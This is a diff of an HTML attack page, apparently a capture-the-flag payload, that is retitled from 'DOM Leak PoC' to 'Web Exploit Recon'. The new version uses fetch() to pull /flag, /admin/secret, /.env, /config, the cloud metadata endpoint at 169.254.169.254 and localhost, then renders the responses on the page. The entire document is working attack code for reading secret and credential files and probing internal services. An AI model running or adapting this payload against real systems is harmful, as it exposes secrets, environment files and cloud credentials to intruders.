@@ -1,34 +1,48 @@
 <!DOCTYPE html>
-<html>
-  <head><meta charset="UTF-8"><title>DOM Leak PoC</title></head>
-  <body>
-    <h1>Leak Internal Content via DOM</h1>
-    <div id="out"></div>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Web Exploit Recon</title>
+</head>
+<body>
+  <h1>Recon Results</h1>
+  <div id="results"></div>
 
-    <script>
-      const paths = [
-        "/flag",
-        "/admin/secret",
-        "/.env",
-        "/config",
-        "http://169.254.169.254/latest/meta-data/"
-      ];
+  <script>
+    const paths = [
+      "/flag",
+      "/admin",
+      "/admin/secret",
+      "/.env",
+      "/config",
+      "/redirector",
+      "http://169.254.169.254/latest/meta-data/",
+      "http://127.0.0.1/",
+      "http://localhost/",
+    ];
 
-      const out = document.getElementById("out");
+    const resultsDiv = document.getElementById("results");
 
-      for (const path of paths) {
-        const iframe = document.createElement("iframe");
-        iframe.src = path;
-        iframe.width = 600;
-        iframe.height = 200;
-        iframe.onload = () => {
-          out.innerHTML += `<h3>${path}</h3><p>Loaded (may or may not be visible)</p>`;
-        };
-        iframe.onerror = () => {
-          out.innerHTML += `<h3>${path}</h3><p>Failed to load</p>`;
-        };
-        out.appendChild(iframe);
-      }
-    </script>
-  </body>
+    for (const path of paths) {
+      fetch(path)
+        .then(r => r.text())
+        .then(t => {
+          const box = document.createElement("div");
+          box.style.border = "1px solid black";
+          box.style.margin = "10px";
+          box.style.padding = "10px";
+          box.innerHTML = `<h3>✅ ${path}</h3><pre>${t.slice(0, 1000)}</pre>`;
+          resultsDiv.appendChild(box);
+        })
+        .catch(err => {
+          const fail = document.createElement("div");
+          fail.style.border = "1px dashed gray";
+          fail.style.margin = "10px";
+          fail.style.padding = "10px";
+          fail.innerHTML = `<h3>❌ ${path}</h3><pre>${err}</pre>`;
+          resultsDiv.appendChild(fail);
+        });
+    }
+  </script>
+</body>
 </html>
